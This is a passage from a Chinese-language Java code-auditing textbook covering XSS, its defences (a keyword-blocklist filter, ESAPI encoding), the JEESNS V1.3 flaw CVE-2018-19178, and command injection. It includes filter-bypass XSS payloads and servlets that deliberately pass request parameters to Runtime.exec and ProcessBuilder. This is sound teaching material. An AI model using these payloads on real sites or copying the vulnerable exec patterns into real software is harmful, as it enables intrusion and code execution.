//\u5B9A\u4E49HTTP\u54CD\u5E94\u5BF9\u8C61response\r
   HttpServletResponse response = ServletActionContext.getResponse();\r
\r
//\u83B7\u5F97\u8BF7\u6C42\u53C2\u6570username\u3001password\u3001relname\u3001introduction\r
    String username = request.getParameter("username"); \r
    String password = request.getParameter("password");\r
    String relname = request.getParameter("relname");\r
    String introduction = request.getParameter("introduction");\r
    AddUserService adds = new AddUserService();\r
\r
//\u4F7F\u7528\u53C2\u6570\u6DFB\u52A0\u7528\u6237\r
    **int i = adds.adduser(username,password,relname,introduction);**\r
   }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u5C06\u8C03\u7528adduser\u65B9\u6CD5\u4F7F\u7528\u53C2\u6570username\u3001password\u3001introduction\u3001relname\u6DFB\u52A0\u7528\u6237\u3002\u800Cadduser\u65B9\u6CD5\u5219\u6267\u884CSQL\u8BED\u53E5\uFF1A\u201Cinsert into test(username,password,relname,person) values (?,?,?,?);\u201D\u5411test\u8868\u4E2D\u63D2\u5165\u7528\u6237\u3002\r
\r
\u5F53\u7528\u6237\u8BBF\u95EE\u7528\u6237\u5217\u8868\u65F6\uFF0C\u7A0B\u5E8F\u5C06\u6267\u884CSQL\u8BED\u53E5\uFF1A\u201Cselect * from test\u201D\uFF0C\u5C06\u6240\u6709\u7528\u6237\u4FE1\u606F\u6253\u5370\u503C\u524D\u53F0\u9875\u9762\u3002\u6B64\u65F6\uFF0C\u5982\u679C\u6570\u636E\u8868\u4E2D\u5B58\u50A8\u4E86\u6076\u610F\u811A\u672C\uFF0C\u4E5F\u540C\u6837\u4F1A\u88AB\u6253\u5370\u81F3\u524D\u53F0\u5E76\u6267\u884C\u3002\u4E0B\u9762\u7ED9\u51FA\u663E\u793A\u81F3\u9875\u9762\u524D\u53F0\u7684JSP\u4EE3\u7801\uFF1A\r
\r
\r
\r
  <%**List<MessageInfo> msginfo = (ArrayList<MessageInfo>)request.getAttribute("msg");//****\u5FAA\u73AF\u904D\u5386\u6570\u7EC4msginfo**\r
\r
  **for(MessageInfo m:msginfo)**{%>\r
\r
<table>\r
\r
  <tr><td class="klytd"> \u7528\u6237\u540D\uFF1A</td>\r
\r
  <td class ="hvttd">\u3000<%=**m.getName()** %></td></tr> //\u83B7\u53D6\u7528\u6237\u540D\r
\r
<tr><td class="klytd">\u5BC6\u7801\uFF1A</td>\r
\r
<td class ="hvttd">\u3000<%=**m.getPasswd()** %></td></tr>//\u83B7\u53D6\u5BC6\u7801\r
\r
<tr><td class="klytd"> \u4ECB\u7ECD\uFF1A</td>\r
\r
<td class ="hvttd">\u3000<%=**m.getIntroduct()** %></td></tr>//\u83B7\u53D6\u4ECB\u7ECD\r
\r
</table> <% **}** %>\r
\r
</div>\r
\r
\r
\r
\uFF083\uFF09  DOM\u578BXSS\r
\r
DOM\u578BXSS\u539F\u7406\u4E0E\u53CD\u5C04\u578BXSS\u7C7B\u4F3C\uFF0C\u5176\u901A\u8FC7\u53EF\u63A7\u53C2\u6570\u62FC\u63A5\u4E3ADOM\u6807\u7B7E\u8F93\u51FA\uFF0C\u5176\u5E38\u89C1\u7684DOM\u6807\u7B7E\u8BF7\u53C2\u8003\u672C\u4E66\u7B2C\u56DB\u7AE0\uFF0C\u672C\u5C0F\u8282\u53EA\u7ED9\u51FA\u6848\u4F8BJava\u4EE3\u7801\u5982\u4E0B:\r
\r
\r
\r
<html>\r
\r
<body>\r
\r
       <div id="a" style="height:300px;width:400px;border:2px solid red" />\r
\r
       <script>//\u5C06id\u4E3Aa\u7684\u5143\u7D20\u5185\u5BB9\u66FF\u6362\u4E3A\u8BF7\u6C42\u53C2\u6570\u4E3Aa\u7684\u503C\r
\r
\u200B    **document.getElementById("a").innerHTML="<%=request.getParameter("a")%>";**\r
\r
\u200B    <\/script>\r
\r
</body>\r
\r
</html>\r
\r
\r
\r
  \u901A\u8FC7\u8F93\u5165\u8BF7\u6C42http://localhost:8080/javatest/DOMtest.jsp?a=123456789\u3002\u53EF\u4EE5\u5C06\u53EF\u63A7\u53C2\u6570a\u7684\u503C\u663E\u793A\u81F3\u9875\u9762\u5982\u56FE13-11\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image616.gif)\r
\r
\u56FE13-11 DOM XSS\u6D4B\u8BD5\u56FE\r
\r
\u5F53\u53EF\u63A7\u53C2\u6570a\u4E3A<img src=1 onerror=alert(1)>\u65F6\uFF0C\u8BE5\u6076\u610F\u811A\u672C\u5C06\u5728\u524D\u53F0\u9875\u9762\u6267\u884C\uFF0C\u5982\u56FE13-12\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image618.gif)\r
\r
\u56FE13-12 DOM\u578BXSS\u5F39\u7A97\u56FE\r
\r
### 13.3.2   Java\u4E2DXSS\u6F0F\u6D1E\u9632\u5FA1\r
\r
\uFF081\uFF09  \u5168\u5C40\u8FC7\u6EE4\u51FD\u6570XSSFilter\r
\r
Java\u4EE3\u7801\u4E2D\u9632\u5FA1XSS\u653B\u51FB\u901A\u5E38\u9700\u8981\u6DFB\u52A0\u4E00\u4E2A\u9632\u5FA1\u5668XSSFilter\u3002\u8F93\u5165\u53C2\u6570\u5728\u4F20\u5165\u540E\u53F0\u524D\uFF0C\u5148\u8C03\u7528\u5168\u5C40\u9632\u5FA1\u5668\u8FDB\u884C\u53C2\u6570\u8FC7\u6EE4\uFF0C\u68C0\u6D4B\u662F\u5426\u5B58\u5728XSS\u7684\u654F\u611F\u51FD\u6570\u6216\u5B57\u7B26\uFF0C\u5982\u679C\u5B58\u5728\u654F\u611F\u5B57\u7B26\u5219\u5BF9\u5176\u8FDB\u884C\u66FF\u6362\u3002\u5728Web\u5E94\u7528\u7684web.xml\u6587\u4EF6\u4E2D\u53EF\u6DFB\u52A0\u8BE5\u5168\u5C40\u8FC7\u6EE4\u5668XSSFilter\uFF0C\u8BE5\u6587\u4EF6\u4E2D\u6DFB\u52A0\u7684\u5185\u5BB9\u5982\u4E0B\uFF1A\r
\r
\r
\r
<filter>\r
\r
<filter-name>**XSSFilter**</filter-name>\r
\r
<filter-clsss>user.Filter.XSSFilter</filter-class>\r
\r
</filter>\r
\r
<filter-mapping>\r
\r
<filter-name>**XSSFilter**</filter-name>\r
\r
<url-pattern>/*</url-pattern><!--\u62E6\u622A\u6240\u6709\u7684\u8BF7\u6C42-->\r
\r
</filter-mapping>\r
\r
\r
\r
\u4E0A\u8FF0XML\u6587\u4EF6\u4E2D\u6DFB\u52A0\u4E86\u8FC7\u6EE4\u5668XSSFilter\uFF0C\u8BE5\u8FC7\u6EE4\u5668\u662F\u4E00\u4E2A\u540D\u4E3AXSSFilter.java\u7684Java\u7C7B\uFF0C\u8BE5\u7C7B\u7528\u6765\u5C06\u7279\u6B8A\u5B57\u7B26\u66FF\u6362\u4E3A\u201C\\\\*\u201D\uFF0C\u66FF\u6362\u7684\u7279\u6B8A\u5B57\u7B26\u5305\u62EC\uFF1Ascript\u3001src\u7B49\uFF0C\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {\r
\r
private String xssClean(String value) {\r
\r
\u200B    if (value != null) {\r
\r
\u200B      value = value.replaceAll("\\0", "");\r
\r
\u200B      //\u66FF\u6362\u7279\u6B8A\u5B57\u7B26<script>(.*?)<\/script>\u4E3A\u7A7A\u5B57\u7B26\r
\r
\u200B      Pattern scriptPattern = Pattern.compile("**<script>(.\\*?)<\/script>**",\r
\r
\u200B          Pattern.CASE_INSENSITIVE);\r
\r
\u200B      value = **scriptPattern.matcher(value).replaceAll("");**\r
\r
\u200B      //\u66FF\u6362\u7279\u6B8A\u5B57\u7B26src[\\r\\n]*=[\\r\\n]*\\\\\\'(.*?)\\\\\\'\u4E3A\u7A7A\u5B57\u7B26\r
\r
\u200B      scriptPattern = Pattern.compile("**src[\\r\\n]\\*=[\\r\\n]\\*\\\\\\'(.\\*?)\\\\\\'**",\r
\r
\u200B          Pattern.CASE_INSENSITIVE | Pattern.MULTILINE\r
\r
\u200B              | Pattern.DOTALL);\r
\r
\u200B      value = **scriptPattern.matcher(value).replaceAll("");**\r
\r
\u200B      \u2026\u7701\u7565\u2026\r
\r
}\r
\r
\r
\r
\uFF082\uFF09  \u4F01\u4E1A\u5B89\u5168API\uFF08ESAPI\uFF09\u9632\u5FA1\r
\r
\u9664\u4E86\u4E0A\u6587\u63D0\u8FC7\u7684\u4F7F\u7528\u5168\u5C40\u8FC7\u6EE4\u51FD\u6570\u9632\u5FA1XSS\u6F0F\u6D1E\u5916\uFF0C\u8FD8\u53EF\u4F7F\u7528\u7B2C\u4E09\u65B9API\u8FDB\u884CXSS\u6F0F\u6D1E\u8FC7\u6EE4\u3002ESAPI\u9879\u76EE\u662FOWASP\u9879\u76EE\uFF0C\u53EF\u4E3A\u6BCF\u4E2AWeb\u5E73\u53F0\u521B\u5EFA\u7B80\u5355\u7684\u5F3A\u5927\u5B89\u5168\u63A7\u4EF6\u3002\u8BE5\u63A7\u4EF6\u65E8\u5728\u6D88\u9664Web\u5B89\u5168\u6F0F\u6D1E\u7684\u5E94\u7528\u7A0B\u5E8F\u3002\r
\r
\u82E5\u8BE5\u5E94\u7528\u7A0B\u5E8F\u4F7F\u7528Maven\u8FDB\u884C\u4F9D\u8D56\u63A7\u5236\uFF0C\u5219\u53EF\u4EE5\u5728pom.xml\u6587\u4EF6\u4E2D\u5BFC\u5165ESAPI\u4F9D\u8D56\u5982\u4E0B\uFF1A\r
\r
\r
\r
<dependency>\r
\r
  <groupId>org.owasp.esapi</groupId>\r
\r
  <artifactId>esapi</artifactId>\r
\r
  <version>2.2.1.1</version>\r
\r
</dependency>\r
\r
\r
\r
\u8FC7\u6EE4\u7684Servlet\u4EE3\u7801\u5982\u4E0B\uFF0C\u5176\u5C06\u4F20\u9012\u7684\u53C2\u6570content\u4F7F\u7528ESAPI\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801\uFF0C\u5C06\u6076\u610F\u811A\u672C\u4EE3\u7801\u8FDB\u884C\u8F6C\u6362\uFF0C\u7136\u540E\u624D\u5C06\u53C2\u6570\u503C\u5171\u4EAB\u5230request\u4E2D\uFF0C\u7ECF\u8FC7\u7F16\u7801\u8F6C\u6362\u7684\u811A\u672C\u5C06\u65E0\u6CD5\u6B63\u5E38\u6267\u884C\uFF0C\u4ECE\u800C\u62B5\u5FA1XSS\u6F0F\u6D1E\u653B\u51FB\u3002\r
\r
\r
\r
@WebServlet("/demo")\r
\r
class xssServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B    this.doGet(request,response);}\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException, ServletException, IOException {\r
\r
   response.setContentType("text/html");// \u8BBE\u7F6E\u54CD\u5E94\u7C7B\u578B\r
\r
   String content = request.getParameter("content"); //\u83B7\u53D6content\u4F20\u53C2\u6570\u636E\r
\r
   **String s = ESAPI.encoder().encodeForJavaScript(content); //****\u8FDB\u884C\u5B9E\u4F53\u7F16\u7801**\r
\r
\u200B    **request.setAttribute("content", s); //content****\u5171\u4EAB\u5230request\u57DF**\r
\r
   request.getRequestDispatcher("/WEB-INF/pages/xss.jsp").forward(request, response); //\u8F6C\u53D1\u5230xxs.jsp\u9875\u9762\u4E2D\r
\r
  }\r
\r
}\r
\r
\r
\r
### 13.3.3  JEESNS\u5E73\u53F0XSS\u6F0F\u6D1E\u5206\u6790\r
\r
\uFF081\uFF09\u6F0F\u6D1E\u5206\u6790\r
\r
JEESNS\u662F\u4E00\u6B3E\u57FA\u4E8EJAVA\u4F01\u4E1A\u7EA7\u5E73\u53F0\u7814\u53D1\u7684\u793E\u4EA4\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u5728JEESNS V1.3\u7248\u672C\u4E2D\uFF0Ccom/lxinet/jeesns/core/utils/XssHttpServletRequestWrapper.java \u6587\u4EF6\u5141\u8BB8\u901A\u8FC7HTML\u7684<embed> \u6807\u7B7E\u63D2\u5165XSS\u653B\u51FB\u4EE3\u7801\uFF0C\u5F62\u6210\u5B58\u50A8\u578BXSS\u6F0F\u6D1E\u3002\u8BE5\u6F0F\u6D1E\u7F16\u53F7\u4E3ACVE-2018-19178\u3002\r
\r
\u5BA1\u8BA1\u8BE5\u7F51\u7AD9\u7684XSS\u6F0F\u6D1E\u5305\u62EC\u4E24\u65B9\u9762\uFF1A\r
\r
l \u8BE5\u7F51\u7AD9\u662F\u5426\u5B58\u5728XSS\u8FC7\u6EE4\uFF0C\u4E14\u53EF\u5426\u7ED5\u8FC7\u3002\r
\r
l XSS\u8FC7\u6EE4\u4F5C\u7528\u4E8E\u54EA\u4E9B\u8BF7\u6C42\u3002\r
\r
\u9996\u5148\u5BF9\u8BE5\u7F51\u7AD9XSS\u8FC7\u6EE4\u51FD\u6570XssHttpServletRequestWrapper.java \u6587\u4EF6\u5BA1\u8BA1\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
/* XSS\u653B\u51FB\u5904\u7406*/\r
\r
 public String getParameter(String parameter) {\r
\r
\u200B    String value = super.getParameter(parameter);\r
\r
\u200B    if (value == null) {return null;}\r
\r
\u200B    return **cleanXSS**(value);//\u5BF9\u8BF7\u6C42\u53C2\u6570\u503C\u8C03\u7528cleanXSS\u51FD\u6570\u8FC7\u6EE4\r
\r
  }\r
\r
  ......\r
\r
  private String **cleanXSS**(String value) {\r
\r
**/\\*\u8FC7\u6EE4\u5B57\u7B26\u4E3A<style>\u3001</style>\u3001<script>\u3001<\/script>\u3001<script \u3001eval\\\\((.\\*)\\\\)\u3001[\\\\\\"\\\\\\'][\\\\s]\\*javascript:(.\\*)[\\\\\\"\\\\\\']\\*/**\r
\r
\u200B    value = value.replaceAll("**(?i)<style>**", "&lt;style&gt;").replaceAll("**(?i)</style>**", "&lt;&#47;style&gt;");\r
\r
\u200B    value = value.replaceAll("**(?i)<script>**", "&lt;script&gt;").replaceAll("**(?i)<\/script>**", "&lt;&#47;script&gt;");\r
\r
\u200B    value = value.replaceAll("**(?i)<script**", "&lt;script");\r
\r
\u200B    value = value.replaceAll("**(?i)eval\\\\((.\\*)\\\\)**", "");\r
\r
\u200B    value = value.replaceAll("**[\\\\\\"\\\\\\'][\\\\s]\\*javascript:(.\\*)[\\\\\\"\\\\\\']**", "\\"\\"");\r
\r
\u200B    // \u9700\u8981\u8FC7\u6EE4\u7684\u811A\u672C\u4E8B\u4EF6\u5173\u952E\u5B57\r
\r
\u200B    String[] eventKeywords = { **"onmouseover", "onmouseout", "onmousedown",**\r
\r
\u200B        **"onmouseup", "onmousemove", "onclick", "ondblclick",**\r
\r
\u200B        **"onkeypress", "onkeydown", "onkeyup", "ondragstart",**\r
\r
\u200B        **"onerrorupdate", "onhelp", "onreadystatechange", "onrowenter",**\r
\r
\u200B        **"onrowexit", "onselectstart", "onload", "onunload",**\r
\r
\u200B        **"onbeforeunload", "onblur", "onerror", "onfocus", "onresize",**\r
\r
\u200B        **"onscroll", "oncontextmenu", "alert"** };\r
\r
\u200B    // \u6EE4\u9664\u811A\u672C\u4E8B\u4EF6\u4EE3\u7801\r
\r
\u200B    for (int i = 0; i < eventKeywords.length; i++) {\r
\r
\u200B      // \u6DFB\u52A0\u4E00\u4E2A"_", \u4F7F\u4E8B\u4EF6\u4EE3\u7801\u65E0\u6548\r
\r
\u200B      value = value.replaceAll(**eventKeywords[i],"_" + eventKeywords[i]**);\r
\r
\u200B    }\r
\r
\u200B    return value;//\u8FD4\u56DE\u8FC7\u6EE4\u540E\u7684\u7ED3\u679C\r
\r
  }\r
\r
}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\uFF1A\r
\r
l \u83B7\u53D6\u53C2\u6570parameter\u7684\u503C\uFF0C\u5224\u65AD\u662F\u5426\u4E3A\u7A7A\uFF1B\r
\r
l \u5BF9\u53C2\u6570\u503C\u8FDB\u884CXSS\u8FC7\u6EE4\uFF0C\u5206\u522B\u8FC7\u6EE4\u5E38\u7528JS\u6807\u7B7E\u53CA\u4E8B\u4EF6\u5173\u952E\u5B57\uFF1B\r
\r
l \u8FD4\u56DE\u8FC7\u6EE4\u540E\u7684\u7ED3\u679C\u3002\r
\r
\u7136\u540E\uFF0C\u8FD8\u9700\u8981\u786E\u5B9A\u4E0A\u8FF0\u8FC7\u6EE4\u51FD\u6570\u4F5C\u7528\u4E8E\u54EA\u4E9B\u8BF7\u6C42\uFF0C\u5BA1\u8BA1\u8BE5\u7F51\u7AD9\u7684web.xml\u6587\u4EF6\uFF0C\u5176\u8FC7\u6EE4\u5668\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<filter>\r
   <filter-name>XssSqlFilter</filter-name><!\u2014\u8FC7\u6EE4\u5668\u540D\u79F0-->\r
   **<filter-class>com.lxinet.jeesns.core.filter.XssFilter</filter-class>**\r
\r
<!\u2014\u4F7F\u7528\u7684\u8FC7\u6EE4\u5668\u7C7B-->\r
 </filter>\r
 <filter-mapping>\r
   <filter-name>XssSqlFilter</filter-name><!\u2014\u8FC7\u6EE4\u5668\u540D\u79F0-->\r
   **<url-pattern>/\\*</url-pattern>**<!\u2014\u8FC7\u6EE4\u5668\u54EA\u4E9B\u8BF7\u6C42\uFF0C\u8FD9\u91CC\u8FC7\u6EE4/*\u5373\u6240\u6709\u8BF7\u6C42-->\r
   <dispatcher>REQUEST</dispatcher><!\u2014\u58F0\u660E\u8C03\u5EA6-->\r
 </filter-mapping>\r
\r
\r
\r
\u81F3\u6B64\uFF0C\u53EF\u77E5\u8BE5XSS\u8FC7\u6EE4\u5668\u5C06\u4F5C\u7528\u4E8E\u8BE5\u7F51\u7AD9\u7684\u6240\u6709\u8BF7\u6C42\uFF0C\u5E76\u8FC7\u6EE4REQUEST\u5BF9\u8C61\u7684\u53C2\u6570\u503C\uFF0C\u4F46\u662F\u8BE5\u7F51\u7AD9\u4F9D\u65E7\u5B58\u5728XSS\u6F0F\u6D1E\u3002\u5982\u679C\u653B\u51FB\u8005\u8BBE\u8BA1\u7684Payload\u53EF\u4EE5\u7ED5\u8FC7XSS\u8FC7\u6EE4\u51FD\u6570\uFF0C\u5C06\u5BFC\u81F4XSS\u6F0F\u6D1E\u7684\u4EA7\u751F\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
\u5F53\u4F7F\u7528\u6D4B\u8BD5\u7684Payload\u4E3A<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">\u5C06\u7ED5\u8FC7\u4E0A\u8FF0\u7684\u8FC7\u6EE4\u51FD\u6570\uFF0C\u5176\u4E2D\u201CPHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\u201D\u662F\u5B57\u7B26\u4E32\u201CHello\u201D\u88ABbase64\u7F16\u7801\u540E\u7684\u7ED3\u679C\u3002\u9664\u6B64\u4E4B\u5916\uFF0C\u8FD8\u53EF\u4F7F\u7528\u7684Payload\u5305\u62EC\uFF1A <svg/onLoad=confirm(1)>\u3001<img src="x" ONERROR=confirm(0)>\u7B49\u3002\r
\r
\u5728\u8BE5\u7F51\u7AD9\u7684\u6587\u7AE0\u53D1\u5E03\u529F\u80FD\u4E2D\u63D0\u4EA4\u4E0A\u8FF0\u7684Payload\u5E76\u70B9\u51FB\u201C\u53D1\u5E03\u201D\u6309\u94AE\uFF0C\u5F53\u518D\u6B21\u8BBF\u95EE\u6587\u7AE0\u5217\u8868\u540E\u5C06\u51FA\u73B0\u5F39\u6846\uFF0C\u5982\u56FE13-13\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image620.gif)\r
\r
\u56FE13-13 JEESNS V1.3 XSS\u6F0F\u6D1E\r
\r
## 13.4 Java\u4EE3\u7801\u4E2D\u7684\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\r
\r
### 13.4.1 Java\u4E2D\u7684\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\r
\r
\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u539F\u7406\u662F\u5F00\u53D1\u4EBA\u5458\u6CA1\u6709\u9488\u5BF9\u4EE3\u7801\u4E2D\u53EF\u6267\u884C\u7684\u7279\u6B8A\u51FD\u6570\u6216\u81EA\u5B9A\u4E49\u65B9\u6CD5\u5165\u53E3\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5BFC\u81F4\u5BA2\u6237\u7AEF\u53EF\u4EE5\u63D0\u4EA4\u6076\u610F\u6784\u9020\u8BED\u53E5\uFF0C\u5E76\u4EA4\u7531\u670D\u52A1\u5668\u7AEF\u6267\u884C\u3002\u4E0EPHP\u4E2D\u547D\u4EE4\u6267\u884C\u51FD\u6570\u4E0D\u540C\uFF0CJava\u4E2D\u80FD\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u7C7B\u5E76\u4E0D\u591A\uFF0C\u901A\u8FC7Java\u6267\u884C\u7CFB\u7EDF\u547D\u4EE4\u7684\u65B9\u6CD5\u5305\u62EC\uFF1ARuntime.getRuntime().exec(command)\u548Cnew ProcessBuilder(cmdArray).start()\u3002\r
\r
\uFF081\uFF09  Runtime\u7C7B\r
\r
Runtime\u8FD9\u4E2A\u51FD\u6570\u6709exec\u65B9\u6CD5\u53EF\u4EE5\u672C\u5730\u6267\u884C\u547D\u4EE4\uFF0C\u5927\u90E8\u5206\u5173\u4E8EJSP\u547D\u4EE4\u6267\u884C\u7684payload\u53EF\u80FD\u90FD\u662F\u8C03\u7528Runtime\u8FDB\u884CRuntime\u7684exec\u65B9\u6CD5\u8FDB\u884C\u547D\u4EE4\u6267\u884C\u7684\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FARuntime\u7C7B\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
@WebServlet("/execServlet")\r
\r
public class execServlet extends HttpServlet {\r
\r
  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
  this.doGet(request, response);\r
\r
  }\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B     **String exec = request.getParameter("exec");**\r
\r
\u200B    **Process res = Runtime.getRuntime().exec(exec);**\r
\r
\u200B     **InputStream inputStream = res.getInputStream();**\r
\r
\u200B    ServletOutputStream outputStream = response.getOutputStream();\r
\r
\u200B    int len;\r
\r
\u200B    byte[] bytes = new byte[1024];\r
\r
\u200B    while ((len = inputStream.read(bytes))!=-1){\r
\r
\u200B      outputStream.write(bytes,0,len);\r
\r
\u200B    }}}\r
\r
\r
\r
\u5F53\u653B\u51FB\u8005\u4F7F\u7528\u7684Payload\u4E3Ahttp://localhost:8080/ execServlet?exec=ipconfig\u5373\u53EF\u6267\u884Cdos\u6307\u4EE4ipconfig\uFF0C\u56FE13-14\u4E3A\u6267\u884C\u7ED3\u679C\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image622.jpg)\r
\r
\u56FE13-14 \u547D\u4EE4\u6267\u884C\u6D4B\u8BD5\u56FE\r
\r
\uFF082\uFF09  ProcessBuilder\u7C7B\r
\r
\u4F7F\u7528ProcessBuilder\u8FDB\u884C\u547D\u4EE4\u6267\u884C\u975E\u5E38\u7B80\u5355\uFF0C\u53EA\u9700\u8981\u901A\u8FC7\u4F20\u9012\u53C2\u6570exec\uFF0C\u7136\u540E\u5728ProcessBuilder\u7684\u6784\u9020\u51FD\u6570\u4F20\u5165\u8BE5\u53C2\u6570\uFF0C\u5E76\u8C03\u7528 start\u65B9\u6CD5\u5373\u53EF\u6267\u884C\u547D\u4EE4\u3002\r
\r
\u4E0B\u9762\u7ED9\u51FAProcessBuilder\u7C7B\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u6848\u4F8B\u4EE3\u7801\uFF1A\r
\r
\r
\r
@WebServlet("/exec2Servlet")\r
\r
public class exec2Servlet extends HttpServlet {\r
\r
  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r
\r
\u200B     **String exec = request.getParameter("exec");**\r
\r
\u200B    **ServletOutputStream outputStream = response.getOutputStream();**\r
\r
\u200B    **ProcessBuilder processBuilder = new ProcessBuilder(exec);**\r
\r
\u200B    **Process res = processBuilder.start();**\r
\r
\u200B    InputStream inputStream = res.getInputStream();\r
\r
\u200B    int len ;\r
\r
\u200B    byte[] bytes =new byte[1024];\r
\r
\u200B    while ((len = inputStream.read(bytes))!=-1){\r
\r
\u200B      outputStream.write(bytes,0,len);\r
\r
\u200B    } } }\r
\r
\r
\r
\u5F53\u653B\u51FB\u8005\u4F7F\u7528\u7684Payload\u4E3Ahttp://localhost:8080/ exec2Servlet?exec=ipconfig\u5373\u53EF\u6267\u884Cdos\u6307\u4EE4ipconfig\uFF0C\u56FE13-15\u4E3A\u6267\u884C\u56FE\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image624.jpg)\r
\r
\u56FE13-15 \u547D\u4EE4\u6267\u884C\u6D4B\u8BD5\u56FE\r
\r
### 13.4.2 Java\u4E2D\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u7531\u4E8E\u547D\u4EE4\u6267\u884C\u6240\u5904\u7684\u573A\u666F\u4E0D\u540C\uFF0C\u56E0\u6B64\u4FEE\u590D\u7684\u65B9\u5F0F\u4E5F\u8981\u6839\u636E\u5B9E\u9645\u573A\u666F\u6765\u3002\u603B\u7684\u6765\u8BF4\uFF0C\u9700\u8981\u6CE8\u610F\u4EE5\u4E0B\u51E0\u70B9\uFF1A\r
\r
l \u5982\u679C\u9700\u8981\u5C06\u7528\u6237\u7684\u8F93\u5165\u7528\u4F5C\u7A0B\u5E8F\u547D\u4EE4\u4E2D\u7684\u53C2\u6570\uFF0C\u90A3\u4E48\u9700\u8981\u5BF9\u7528\u6237\u7684\u8F93\u5165\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4F46\u5B9E\u9645\u573A\u666F\u8FC7\u4E8E\u590D\u6742\u3001\u53C2\u6570\u96BE\u4EE5\u8FFD\u8E2A\uFF0C\u5BFC\u81F4\u8FD9\u79CD\u8FC7\u6EE4\u96BE\u5EA6\u5F88\u5927\uFF0C\u5728\u7A0B\u5E8F\u6709\u9009\u62E9\u7684\u8FC7\u6EE4\u6F5C\u5728\u7684\u5371\u9669\u5B57\u7B26\u65F6\uFF0C\u53EA\u8981\u653B\u51FB\u8005\u7684\u5B57\u7B26\u4E0D\u5728\u5176\u9ED1\u540D\u5355\u5185\uFF0C\u90A3\u4E48\u5E94\u7528\u7A0B\u5E8F\u53D7\u5230\u653B\u51FB\u7684\u6982\u7387\u5C06\u663E\u8457\u63D0\u9AD8\uFF0C\u6240\u4EE5\u66F4\u597D\u7684\u65B9\u6CD5\u662F\u7EC4\u5EFA\u4E00\u4EFD\u767D\u540D\u5355\uFF0C\u5141\u8BB8\u5176\u4E2D\u7684\u5B57\u7B26\u51FA\u73B0\u5728\u8F93\u5165\u4E2D\uFF0C\u5E76\u53EA\u63A5\u53D7\u5B8C\u5168\u7531\u8FD9\u4E9B\u7ECF\u8BA4\u53EF\u7684\u5B57\u7B26\u7EC4\u6210\u7684\u8F93\u5165\uFF0C\u5F53\u7136\u8FD9\u79CD\u65B9\u6848\u5E76\u4E0D\u662F\u5B8C\u7F8E\u7684\uFF0C\u6709\u65F6\u5019\u653B\u51FB\u8005\u901A\u8FC7\u767D\u540D\u5355\u5185\u7684\u5B57\u7B26\u7EC4\u5EFA\u7ED5\u8FC7\u68C0\u6D4B\uFF0C\u540C\u6837\u53EF\u4EE5\u8FBE\u5230\u653B\u51FB\u7684\u76EE\u7684\uFF0C\u56E0\u6B64\u5982\u4F55\u6784\u5EFA\u767D\u540D\u5355\u3001\u5982\u679C\u8BBE\u7F6E\u8FC7\u6EE4\u673A\u5236\u662F\u5173\u952E\u3002\r
\r
l \u6709\u65F6\u5019\u653B\u51FB\u53EF\u4EE5\u901A\u8FC7\u4FEE\u6539\u73AF\u5883\u4E2D\u7684\u547D\u4EE4\u6307\u4EE4\u6765\u8FBE\u5230\u653B\u51FB\u7684\u6548\u679C\uFF0C\u56E0\u6B64\u5E94\u8BE5\u8BBE\u7F6E\u7EDD\u5BF9\u8DEF\u5F84\u6765\u6267\u884C\u547D\u4EE4\u3002\r
\r
l \u4E25\u683C\u8BBE\u7F6E\u6743\u9650\uFF0C\u6709\u65F6\u7528\u6237\u6240\u9700\u6267\u884C\u547D\u4EE4\u4EC5\u9700\u5F88\u5C0F\u7684\u6743\u9650\uFF0C\u5982\u679C\u5728\u4EE3\u7801\u4E2D\u4E0D\u8BBE\u7F6EsetAccessible(true);\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u5C31\u65E0\u6CD5\u8C03\u7528 Runtime.exec()\u6267\u884C\u547D\u4EE4\u3002\r
\r
## 13.5 Java\u4EE3\u7801\u4E2D\u7684\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\r
\r
### 13.5.1 Java\u4E2D\u7684\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\r
\r
